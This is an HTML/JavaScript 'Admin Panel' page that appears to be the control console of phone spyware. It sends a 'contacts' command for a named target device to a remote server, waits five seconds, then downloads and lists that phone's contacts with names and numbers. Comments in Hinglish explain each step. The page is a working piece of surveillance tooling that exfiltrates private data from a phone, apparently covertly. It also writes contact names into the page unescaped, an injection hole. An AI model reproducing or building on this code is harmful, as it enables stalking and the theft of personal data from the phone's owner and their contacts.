<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: #1a1a1a;
            --text-main: #ffffff;
            --accent: #4caf50;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
        }
        .container { max-width: 450px; margin: auto; }
        
        /* Header */
        .header { 
            display: flex; align-items: center; 
            padding-bottom: 15px; border-bottom: 1px solid #333; margin-bottom: 20px;
        }
        .back-btn { 
            color: white; font-size: 1.2rem; margin-right: 15px; 
            text-decoration: none; padding: 5px;
        }
        .title-area h2 { margin: 0; font-size: 1.2rem; }
        .device-tag { 
            font-size: 0.7rem; background: #333; 
            padding: 2px 8px; border-radius: 10px; color: var(--accent); 
        }

        /* Contact List */
        .contact-list { display: flex; flex-direction: column; gap: 10px; }
        
        .contact-card {
            background: var(--glass-bg);
            padding: 15px; border-radius: 12px;
            display: flex; align-items: center; justify-content: space-between;
            border: 1px solid #333;
        }
        .contact-left { display: flex; align-items: center; gap: 15px; }
        
        .avatar {
            width: 40px; height: 40px;
            background: linear-gradient(135deg, #4caf50, #2e7d32);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-weight: bold; font-size: 1.1rem;
        }
        
        .info h3 { margin: 0; font-size: 1rem; font-weight: 500; }
        .info p { margin: 3px 0 0; font-size: 0.85rem; color: #aaa; }

        .action-btn {
            color: var(--accent); font-size: 1.2rem;
            text-decoration: none; padding: 5px;
        }

        /* Loading & Error */
        .status-msg { text-align: center; margin-top: 50px; color: #888; }
        .refresh-btn {
            background: var(--accent); color: white; border: none;
            padding: 10px 20px; border-radius: 20px; margin-top: 15px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
            <div class="title-area">
                <h2>Contacts</h2>
                <span class="device-tag" id="displayID">Connecting...</span>
            </div>
        </div>

        <div id="contactsContainer" class="contact-list">
            <div class="status-msg">
                <i class="fas fa-spinner fa-spin" style="font-size: 2rem;"></i>
                <p>Requesting data from phone...</p>
            </div>
        </div>
    </div>

    <script>
        // --- SMART ID LOGIC ---
        // 1. Index page se jo ID save ki thi, use uthao
        let TARGET_ID = localStorage.getItem("TARGET_DEVICE_ID");

        // 2. Agar koi ID save nahi hai, to Logs wali ID use karo (Fallback)
        if (!TARGET_ID || TARGET_ID === "Connecting...") {
            TARGET_ID = "M2103K19I"; 
        }

        // Screen par ID dikhao
        document.getElementById("displayID").innerText = TARGET_ID;

        const RENDER_URL = "https://child-v9no.onrender.com";

        // Step 1: Page khulte hi Command bhejo
        async function init() {
            try {
                // Command bhejo: Phone ko bolo "Contacts upload karo"
                console.log(`Sending command to ${TARGET_ID}...`);
                await fetch(`${RENDER_URL}/api/send-command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: TARGET_ID, command: 'contacts' })
                });

                // User ko update do
                const container = document.getElementById("contactsContainer");
                container.innerHTML = `
                    <div class="status-msg">
                        <i class="fa-solid fa-satellite-dish"></i>
                        <p>Command sent to ${TARGET_ID}.<br>Waiting for upload (5s)...</p>
                    </div>
                `;

                // 5 Second ruk kar data fetch karo
                setTimeout(fetchContacts, 5000);

            } catch (err) {
                document.getElementById("contactsContainer").innerHTML = `
                    <div class="status-msg" style="color:#ff4444">
                        <p>Server Connection Failed.</p>
                    </div>`;
            }
        }

        // Step 2: Data download karke show karo
        async function fetchContacts() {
            const container = document.getElementById("contactsContainer");
            
            try {
                const response = await fetch(`${RENDER_URL}/api/get-data/${TARGET_ID}/contacts`);
                const data = await response.json();

                // Agar data khali hai ya error hai
                if (!data || data.length === 0 || data.error) {
                    container.innerHTML = `
                        <div class="status-msg">
                            <p>No contacts received yet.</p>
                            <button class="refresh-btn" onclick="location.reload()">Try Again</button>
                        </div>
                    `;
                    return;
                }

                // List banao
                container.innerHTML = ""; // Purana loading hatao
                
                data.forEach(contact => {
                    // Agar naam nahi hai toh "Unknown"
                    const name = contact.name || "Unknown";
                    const number = contact.number || "No Number";
                    const initial = name.charAt(0).toUpperCase();

                    const html = `
                        <div class="contact-card">
                            <div class="contact-left">
                                <div class="avatar">${initial}</div>
                                <div class="info">
                                    <h3>${name}</h3>
                                    <p>${number}</p>
                                </div>
                            </div>
                            <a href="tel:${number}" class="action-btn"><i class="fa-solid fa-phone"></i></a>
                        </div>
                    `;
                    container.innerHTML += html;
                });

            } catch (error) {
                console.error(error);
                container.innerHTML = `
                    <div class="status-msg">
                        <p>Data file not found yet.</p>
                        <button class="refresh-btn" onclick="location.reload()">Refresh</button>
                    </div>
                `;
            }
        }

        // Script chalao
        window.onload = init;
    </script>
</body>
</html>
